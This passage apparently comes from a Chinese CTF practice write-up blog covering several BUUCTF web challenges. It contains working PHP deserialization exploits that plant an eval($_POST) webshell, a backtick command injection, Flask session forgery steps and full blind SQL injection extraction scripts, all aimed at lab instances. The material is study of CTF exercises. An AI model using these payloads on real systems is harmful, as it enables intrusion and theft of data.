+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715001039395.png" alt="image-20220715001039395"></p>
+<p>调试一下可以看到我们的链子是正确的</p>
+<p>然后我们需要做的部分是绕过data里的exit()函数，因为</p>
+<p><code>$data = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p>
+<p>这个格式化输出固定了长度为12的数值，不能写入我们的shell</p>
+<p>这里就要利用p牛讲过的利用伪协议的base64破坏原有的php内容的方式了</p>
+<blockquote>
+<p>由于&lt;、?、()、;、&gt;、\n都不是base64编码的范围，所以base64解码的时候会自动将其忽略，所以解码之后就剩phpexit了，但是呢base64算法解码时是4个字节一组，所以我们还需要在前面加个字符</p>
+</blockquote>
+<p>在本题里就是php//exit加上中间格式化的12个字符共21个</p>
+<p>我们先让</p>
+<pre class="language-none"><code class="language-none">options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;</code></pre>
+
+<p>这样就会令写入的内容进行base64的解码</p>
+<p>然后让</p>
+<pre class="language-none"><code class="language-none">complete &#x3D; &quot;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&quot;
+&#x2F;&#x2F;xxx&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;</code></pre>
+
+<p>本地尝试一下可以成功写入</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715002606265.png" alt="image-20220715002606265"></p>
+<p>然后执行命令就可以了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003158025.png" alt="image-20220715003158025"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220715003215168.png" alt="image-20220715003215168"></p>
+<p>exp</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+
+class A &#123;
+
+    protected $store;
+
+    protected $key;
+
+    protected $expire;
+
+    public function __construct() &#123;
+        $this-&gt;key &#x3D; &#39;shell.php&#39;;
+        $this-&gt;store &#x3D; new B();;
+        $this-&gt;expire &#x3D; 0;
+        $this -&gt; autosave &#x3D; false;
+        $this -&gt; complete &#x3D; &#39;xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8+&#39;;
+        $this -&gt; cache &#x3D; array();
+    &#125;
+&#125;
+
+class B &#123;
+    public $options &#x3D; array();
+    function __construct()
+    &#123;
+        $this-&gt;options[&#39;serialize&#39;] &#x3D; &#39;trim&#39;;
+        $this-&gt;options[&#39;prefix&#39;] &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;;
+        $this-&gt;options[&#39;data_compress&#39;] &#x3D; false;
+    &#125;
+
+&#125;
+
+echo urlencode(serialize(new A()));
+    
+&#x2F;&#x2F;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A4%3A%22trim%22%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A8%3A%22complete%22%3Bs%3A39%3A%22xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8%2B%22%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7D%7D
+</code></pre>
+
+<p><strong>另一种解法</strong></p>
+<p>让</p>
+<pre class="language-none"><code class="language-none">$b &#x3D; new B();
+$b-&gt;writeTimes &#x3D; 0;
+$b -&gt; options &#x3D; array(&#39;serialize&#39; &#x3D;&gt; &quot;system&quot;,
+    &#39;data_compress&#39; &#x3D;&gt; false,
+    &#39;prefix&#39; &#x3D;&gt; &quot;b&quot;);
+
+$a &#x3D; new A($store &#x3D; $b, $key &#x3D; &quot;.php&quot;, $expire &#x3D; 0);
+$a-&gt;autosave &#x3D; false;
+$a-&gt;cache &#x3D; array();
+$a-&gt;complete &#x3D; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39;
+echo urlencode(serialize($a));
+</code></pre>
+
+<p>相当于</p>
+<p>执行</p>
+<pre class="language-php" data-language="php"><code class="language-php">system(&#39;[[],&quot;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&quot;]&#39;)</code></pre>
+
+<p>在shell里执行的时候 反引号 的优先级是高于引号的，所以会先执行<code>cat /flag &gt; ./flag.php</code>，flag就被写到flag.php里面去了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716114417633.png" alt="image-20220716114417633"></p>
+<p><a target="_blank" rel="noopener" href="https://www.sec-in.com/article/333">EIS 2019]EzPOP的多种解-SecIN (sec-in.com)</a></p>
+<p>这个好像是根据thinkphp6.0的链子出的题</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716115312823.png" alt="image-20220716115312823"></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194036">Thinkphp 6.0 新的Gadget - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+class SYCLOVER &#123;
+    public $syc;
+    public $lover;
+
+    public function __wakeup()&#123;
+        if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123;
+           if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123;
+               eval($this-&gt;syc);
+           &#125; else &#123;
+               die(&quot;Try Hard !!&quot;);
+           &#125;
+           
+        &#125;
+    &#125;
+&#125;
+
+if (isset($_GET[&#39;great&#39;]))&#123;
+    unserialize($_GET[&#39;great&#39;]);
+&#125; else &#123;
+    highlight_file(__FILE__);
+&#125;
+
+?&gt;</code></pre>
+
+<p>其实看起来很简单，利用数组绕过if判断然后可以利用反引号什么的执行命令</p>
+<p>但是唯一的问题在于eval不能执行数组中的命令</p>
+<p>所以这里要用Error类当当作字符串的时候会触发toString函数导致XSS</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716121942056.png" alt="image-20220716121942056"></p>
+<blockquote>
+<p>可以看到当作字符串时返回的内容会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来，但其本身其实并不一样，所以可以利用这个来绕过sha1和md5的比较</p>
+</blockquote>
+<p>最后就是构造我们的payload</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125507887.png" alt="image-20220716125507887"></p>
+<p>这里因为引号和括号都被过滤了，所以采用取反的方式，至于最后添加的?&gt;是为了使整个命令闭合(?应该</p>
+<p>其实更严谨一点要用?&gt;&lt;?=include ?&gt;这种</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">事实上$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;之后，我在本地把$this-&gt;syc输出出来的内容前面一部分是Error: ?&gt;&lt;?&#x3D;include~Й���; in +报错路径这种，我本来觉得?&gt;的效果是把命令和没有用的报错分开，但这里如果去掉前面的?&gt;&lt;?&#x3D;还是可以拿到flag，但是为什么去掉后面的?&gt;就不行了呢，而且把后面的?&gt;用分号代替也不行,好怪啊</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125448997.png" alt="image-20220716125448997"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220716125651077.png" alt="image-20220716125651077"></p>
+<h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>好烦sql注入</p>
+<p>先是预处理的堆叠注入</p>
+<pre class="language-none"><code class="language-none">prepare stmt_name from preparable_stmt;
+execute stmt_name [using @var_name [, @var_name] ...];
+&#123;deallocate | drop&#125; prepare stmt_name;</code></pre>
+
+<p>还是个时间盲注</p>
+<p>过滤了一些关键字，可以用十六进制来绕过</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/t01c4535f91421496d4.png" alt="img"></p>
+<p>抄个脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">#author: c1e4r
+import requests
+import json
+import time
+ 
+def main():
+    #题目地址
+    url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Index&#39;&#39;&#39;
+    #注入payload
+    payloads &#x3D; &quot;admin&#39;;set @a&#x3D;0x&#123;0&#125;;prepare b from @a;execute b--+&quot;
+    flag &#x3D; &#39;&#39;
+    for i in range(1,30):
+        #查询payload
+        payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot;
+        for j in range(0,128):
+            #将构造好的payload进行16进制转码和json转码
+            datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125;
+            data &#x3D; json.dumps(datas)
+            times &#x3D; time.time()
+            res &#x3D; requests.post(url &#x3D; url, data &#x3D; data)
+            if time.time() - times &gt;&#x3D; 3:
+                flag &#x3D; flag + chr(j)
+                print(flag)
+                break
+ 
+def str_to_hex(s):
+    return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s])
+ 
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+    main()</code></pre>
+
+<p>扫到最后能发现是glzjin_wants_a_girl_friend.zip</p>
+<p>应该是源码文件，下载下来审计一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124740608.png" alt="image-20220719124740608"></p>
+<p>这里如果$viewDate可控，就能达到变量覆盖的目的</p>
+<p><strong><code>extract</code></strong> 传入 <strong><code>viewdata</code></strong> 数组造成变量覆盖，发现利用 <strong><code>loadView</code></strong> 方法的并且第二个元素可控的地方只有**<code>UserController.php</code>**</p>
+<p>在UserController.php中</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719123840518.png" alt="image-20220719123840518"></p>
+<p>$listData是从REQUEST提取出来的，完全可控。</p>
+<p>在 <code>userIndex.php</code> 文件里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719124437218.png" alt="image-20220719124437218"></p>
+<p>我们可以通过变量覆盖img_file这个变量达到文件包含flag文件的目的</p>
+<p>在fun.php显示了路由控制的部分</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719125349740.png" alt="image-20220719125349740"></p>
+<p>所以最后的payload就是</p>
+<p><code>r=User/Index&amp;img_file=/../flag.php</code></p>
+<p>这里的路径不能直接../flag.php是因为**dirname(__FILE__)**返回的路径是类似C:/root/www/b.php这种，所以要用/../flag.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719130208217.png" alt="image-20220719130208217"></p>
+<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>一个长着ssrf壳的Flask  session伪造</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152339337.png" alt="image-20220719152339337"></p>
+<p>可以看到在/flag路由下需要对session进行一个检查，我们先看一下当前的session</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152324051.png" alt="image-20220719152324051"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152525813.png" alt="image-20220719152525813"></p>
+<p>里面的base64解码内容是www-data</p>
+<p>我们需要构造成fuck</p>
+<p>但是flask的session构造需要一个密钥</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152730546.png" alt="image-20220719152730546"></p>
+<p>题目里的密钥是随机的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719152757332.png" alt="image-20220719152757332"></p>
+<p>但只要有种子，就能得到伪随机数的内容</p>
+<p>这里的seed使用的uuid.getnode()的值</p>
+<p>这是是网卡mac地址的十进制数，储存路径为</p>
+<p>/sys/class/net/（对应网卡）/address</p>
+<p>//一般都是eth0</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719153332165.png" alt="image-20220719153332165"></p>
+<p>得到数值为</p>
+<p>187154010911467</p>
+<p>然后跑随机数</p>
+<pre class="language-python" data-language="python"><code class="language-python">import random
+random.seed(187154010911467)
+print(str(random.random()*233))</code></pre>
+
+<p>这里有个坑</p>
+<p>题目环境是python2，然后会给随机数的后几位四舍五入，所以如果用python3跑拿不到正确的key</p>
+<p>python2 ： 147.299990175</p>
+<p>python3 ：147.299990174972</p>
+<p>然后就是用flask-session-cookie-manager-master.py来伪造session</p>
+<p>先拿到原本的格式</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164437961.png" alt="image-20220719164437961"></p>
+<p>然后修改内容后加密</p>
+<p>(这里有几个csdn的wp上的key带了引号，但是我试的时候发现带了引号拿到的值没法访问flag)</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719164413939.png" alt="image-20220719164413939"></p>
+<p>改一下session然后访问/flag路由就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719165101903.png" alt="image-20220719165101903"></p>
+<h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>又是个sql的盲注。。。</p>
+<p>注入点在热点的id上</p>
+<p>直接上脚本了</p>
+<pre class="language-python" data-language="python"><code class="language-python">from time import sleep
+
+import requests
+flag &#x3D; &#39;&#39;
+url &#x3D; &#39;http:&#x2F;&#x2F;5e09d480-4e60-4c83-86e7-50a897fd3c8f.node4.buuoj.cn:81&#x2F;backend&#x2F;content_detail.php?id&#x3D;1&#39;
+payload &#x3D; &#39;^(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;   #news
+payload1 &#x3D; &#39;^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;\&#39;news\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;  #admin,content
+payload2 &#x3D; &#39;^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;\&#39;admin\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#admin表里有id,username,password,is_enable  contents表里有id,title,content,is_enable
+payload3 &#x3D; &#39;^(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#username 9e014c86,7385d505    password a40b205c,8d44ad75
+for i in range(1,1000):
+    high &#x3D; 137
+    low &#x3D; 28
+    mid &#x3D; (high + low) &#x2F;&#x2F; 2
+    while(low &lt; high):
+        urls &#x3D; url + payload3.format(i,mid)
+        response &#x3D; requests.get(urls)
+        print(low,response.text,mid,high)
+        if &#39;content&#39;  in response.text:
+            low &#x3D; mid + 1
+        else:
+            high &#x3D; mid
+        mid &#x3D; (high + low) &#x2F;&#x2F; 2
+        #print(mid)
+        sleep(0.2)
+    if chr(mid) &#x3D;&#x3D; &#39;&#39;:
+        break
+    else:
+        flag +&#x3D; chr(mid)
+    print(flag)</code></pre>
+
+<p>输入第二组用户名密码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719201159850.png" alt="image-20220719201159850"></p>
+<h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+$MY &#x3D; create_function(&quot;&quot;,&quot;die(&#96;cat flag.php&#96;);&quot;);
+$hash &#x3D; bin2hex(openssl_random_pseudo_bytes(32));
+eval(&quot;function SUCTF_$hash()&#123;&quot;
+    .&quot;global \$MY;&quot;
+    .&quot;\$MY();&quot;
+    .&quot;&#125;&quot;);
+if(isset($_GET[&#39;func_name&#39;]))&#123;
+    $_GET[&quot;func_name&quot;]();
+    die();
+&#125;
+show_source(__FILE__);</code></pre>
+
+<p>本来以为是openssl_random_pseudo_bytes这个函数有类似伪随机数的漏洞，看了下wp发现是create_function的问题</p>
+<p>create_function()函数在create之后会自动生成一个函数名为%00lambda_[0-999]，后面的数字会逐步递增</p>
+<p>前几个试不出来就跑一遍就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719214748226.png" alt="image-20220719214748226"></p>
+<h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><p>开局一个长得像sql注入的登陆页面，实际上是弱密码。。。admin/password</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220511699.png" alt="image-20220719220511699"></p>
+<p>上传个文件直接重命名成txt了。。。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719220406784.png" alt="image-20220719220406784"></p>
+<p>然后这里的file参数，试着用伪协议读源码</p>
+<p>upload.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221052065.png" alt="image-20220719221052065"></p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; 
+
+&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
+	上传文件
+	&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;
+	&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;
+&lt;&#x2F;form&gt;
+
+&lt;?php
+error_reporting(0);
+class Uploader&#123;
+	public $Filename;
+	public $cmd;
+	public $token;
+	
+
+	function __construct()&#123;
+		$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;
+		$ext &#x3D; &quot;.txt&quot;;
+		@mkdir($sandbox, 0777, true);
+		if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;
+			$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];
+		&#125;
+		else&#123;
+			$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;
+		&#125;
+
+		$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;
+		$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];
+	&#125;
+
+	function upload($file)&#123;
+		global $sandbox;
+		global $ext;
+
+		if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;
+			$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;
+		&#125;
+		else&#123;
+			if($file[&#39;size&#39;] &gt; 1024)&#123;
+				$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;
+			&#125;
+			else&#123;
+				$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;
+			&#125;
+		&#125;
+	&#125;
+
+	function __toString()&#123;
+		global $sandbox;
+		global $ext;
+		&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;
+		return $this-&gt;Filename;
+	&#125;
+
+	function __destruct()&#123;
+		if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;
+			$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;
+		&#125;
+		eval($this-&gt;cmd);
+	&#125;
+&#125;
+
+if(isset($_FILES[&#39;file&#39;])) &#123;
+	$uploader &#x3D; new Uploader();
+	$uploader-&gt;upload($_FILES[&quot;file&quot;]);
+	if(@file_get_contents($uploader))&#123;
+		echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;
+		echo file_get_contents($uploader);
+	&#125;
+&#125;
+
+?&gt;</code></pre>
+
+<p>home.php</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+session_start();
+echo &quot;&lt;meta http-equiv&#x3D;\&quot;Content-Type\&quot; content&#x3D;\&quot;text&#x2F;html; charset&#x3D;utf-8\&quot; &#x2F;&gt; &lt;title&gt;Home&lt;&#x2F;title&gt;&quot;;
+error_reporting(0);
+if(isset($_SESSION[&#39;user&#39;]))&#123;
+	if(isset($_GET[&#39;file&#39;]))&#123;
+		if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;
+			die(&quot;hacker!&quot;);
+		&#125;
+		else&#123;
+			if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;upload$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;
+				$file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;
+			&#125;
+			else&#123;
+				$file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
+			&#125;
+			echo &quot;当前引用的是 &quot;.$file;
+			require $file;
+		&#125;
+		
+	&#125;
+	else&#123;
+		die(&quot;no permission!&quot;);
+	&#125;
+&#125;
+?&gt;</code></pre>
+
+<p>主要还是在upload里</p>
+<p>看见这俩函数就直接猜是反序列化了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221735567.png" alt="image-20220719221735567"></p>
+<p>但是没用反序列化函数，所以应该是phar的反序列化</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719221819320.png" alt="image-20220719221819320"></p>
+<p>file_get_contents刚好能触发</p>
+<p><code>file_get_contents()</code> 使 <code>$uploader</code> 通过<code>__toString()</code> 返回 <code>$this-&gt;Filename</code>，<code>$this-&gt;Filename</code> 可控，因此此处 <code>$this-&gt;Filename</code> 用来触发 phar，<code>__destruct()</code> 方法内 <code>eval($this-&gt;cmd);</code> 进行 RCE</p>
+<pre class="language-php" data-language="php"><code class="language-php">function __destruct()&#123;
+    if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;
+        $this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;
+    &#125;
+    eval($this-&gt;cmd);
+&#125;</code></pre>
+
+<p>只要<code>$this-&gt;token</code> 和 <code>$_SESSION[&#39;user&#39;]</code> 相等，我们就能执行自己的命令</p>
+<p> <code>$_SESSION[&#39;user&#39;]</code>我们在不加name参数的时候上传文件就会作为文件名的一部分</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235107502.png" alt="image-20220719235107502"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235345024.png" alt="image-20220719235345024"></p>
+<p>GXYc20516553292cd91851e49f51dda07ef</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235817304.png" alt="image-20220719235817304"></p>
+<p>把得到的路径作为name的值然后随便上传个文件就行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220719235951088.png" alt="image-20220719235951088"></p>
+<p>再来看看非预期解</p>
+<p><strong>一</strong></p>
+<p>因为name参数的值就是文件名，也没过滤php，所以直接让name=1.php传马就得了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000525217.png" alt="image-20220720000525217"></p>
+<p><strong>二</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720000611322.png" alt="image-20220720000611322"></p>
+<p>上传后会显示出 <code>$uploader</code> 这个文件的内容，所以只要使 <code>$this-&gt;Filename</code> 为 <code>flag.php</code> 然后随便传个东西就会得到 flag 了。</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220720001429927.png" alt="image-20220720001429927"></p>
+<p>（别传带内容的文件，会被覆盖，要用空文件</p>
+<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+$comm1 &#x3D; $_GET[&#39;comm1&#39;];
+$comm2 &#x3D; $_GET[&#39;comm2&#39;];
+
+
